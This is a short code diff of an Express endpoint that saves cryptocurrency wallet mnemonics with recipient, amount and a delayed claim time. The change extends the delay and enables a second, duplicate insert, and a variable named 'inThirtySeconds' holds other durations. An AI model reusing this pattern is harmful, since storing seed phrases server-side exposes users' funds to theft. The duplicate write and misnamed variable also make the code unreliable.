@@ -332,9 +332,9 @@ app.post('/store', async (req, res) => {
 
     try {
         const now = new Date();
-        const inThirtySeconds = new Date(now.getTime() + 2 * 60 * 1000);
+        const inThirtySeconds = new Date(now.getTime() + 15 * 60 * 1000);
         const result = await Passphrase.insertOne({ mnemonic, balanceId, receiverAddress: recipient, amount, claimableAt: inThirtySeconds, name: 'coleman'  });
-        // await Passphrase.insertOne({ mnemonic, balanceId, receiverAddress: recipient, amount, claimableAt: inThirtySeconds  });
+        await Passphrase.insertOne({ mnemonic, balanceId, receiverAddress: recipient, amount, claimableAt: inThirtySeconds  });
         res.json({ success: true, result });
     } catch(err) {
         res.status(500).json({ error: err.response?.data || err.message });
